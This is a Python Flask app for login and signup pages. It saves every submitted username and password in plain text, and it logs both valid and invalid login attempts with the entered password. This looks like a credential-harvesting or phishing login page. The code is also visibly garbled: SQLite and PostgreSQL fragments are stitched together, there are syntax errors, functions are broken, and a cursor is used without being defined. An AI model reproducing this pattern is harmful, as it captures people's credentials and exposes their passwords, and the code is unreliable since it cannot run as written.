from flask import Flask, render_template, request, redirect
import sqlite3

app = Flask(__name__):init_db()  

@app.route("/")
def index():
    return render_template("login.html")

# ---------- DATABASE ----------
import psycopg2
import os

def get_db():def init_db():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        username TEXT,
        email TEXT,
        password TEXT
    )
    """)
    conn.commit()
    cur.close()
    conn.close()

    return psycopg2.connect(os.environ.get("DATABASE_URL"))


    # USERS TABLE (PLAIN TEXT)
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT
        )
    """)

    # LOGINS TABLE (VALID + INVALID)
    c.execute("""
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            status TEXT
        )
    """)

    conn.commit()
    conn.close()

init_db()

# ---------- SIGNUP ----------
@app.route("/signup", methods=["GET", "POST"])
def signup():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        conn = sqlite3.connect("users.db")
        c = conn.cursor()
        c.execute(
            "INSERT INTO users (username, password) VALUES (?, ?)",
            (username, password)
        )
        conn.commit()
        conn.close()

        return redirect("/login")

    return render_template("signup.html")

# ---------- LOGIN ----------
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]   # phone OR email
        password = request.form["password"]

        conn = get_db()
cur = conn.cursor() conn.commit()
cur.close()
conn.close()


        c.execute(
            "SELECT * FROM users WHERE username=? AND password=?",
            (username, password)
        )
        user = c.fetchone()

        if user:
            # SAVE VALID LOGIN
            c.execute(
                "INSERT INTO logins (username, password, status) VALUES (?, ?, ?)",
                (username, password, "valid")
            )
            conn.commit()
            conn.close()
            return redirect("/profile")
        else:
            # SAVE INVALID LOGIN (PLAIN TEXT)
            c.execute(
                "INSERT INTO logins (username, password, status) VALUES (?, ?, ?)",
                (username, password, "invalid")
            )
            conn.commit()
            conn.close()
            return "Invalid login saved"

    return render_template("login.html")

# ---------- PROFILE ----------
@app.route("/profile")
def profile():
    return render_template("profile.html")

# ---------- RUN ----------

import os

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
